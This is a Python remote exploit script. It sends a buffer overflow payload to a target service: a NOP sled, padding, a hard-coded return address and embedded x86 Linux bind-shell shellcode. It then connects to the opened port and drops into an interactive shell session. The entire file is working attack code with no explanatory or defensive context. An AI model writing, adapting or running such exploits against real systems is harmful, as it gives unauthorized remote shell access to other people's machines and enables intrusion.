#!/usr/bin/python
# usage ./a2 <target ip> <target application port>  <bind shell port>

import socket
import struct
import sys
import telnetlib

tarip = sys.argv[1]
aport = int(sys.argv[2])
bport = int(sys.argv[3])

# Bindshell
# adopted from http://lsd-pl.net/projects/asmcodes.zip  bindsckcode.asm
#my $bindshell =
sc="\x31\xc0\x50\x68\x03\x01\x05\x39\x44\x44\x40\x40\x66\x50\x31\xc0"
sc+="\x89\xe7\x50\x6a\x01\x6a\x02\x89\xe1\xb0\x66\x31\xdb\x43\xcd\x80"
sc+="\x6a\x10\x57\x50\x89\xe1\xb0\x66\x43\xcd\x80\xb0\x66\xb3\x04\x89"
sc+="\x44\x24\x04\xcd\x80\x31\xc0\x83\xc4\x0c\x50\x50\xb0\x66\x43\xcd"
sc+="\x80\x89\xc3\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2"
sc+="\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
sc+="\x99\xb0\x0b\xcd\x80";

conn = "[+] Connecting to target %s on port %d.  Type exit to quit." %(tarip, bport)

bufover = "\x90"*144
bufover += "B"*101
bufover += "A"*39
bufover += "\x73\x31\xb7\x47"
bufover += "%s" % sc
bufover += "B"*131
print(bufover)

s = socket.socket()
s.connect((tarip, aport))

s.send(bufover)
line = s.recv(1024)
sys.stdout.write(line)

s.shutdown(socket.SHUT_WR)
s.close()
s = socket.socket()
s.connect((tarip, bport))
t = telnetlib.Telnet()
t.sock = s
print(conn)
t.interact()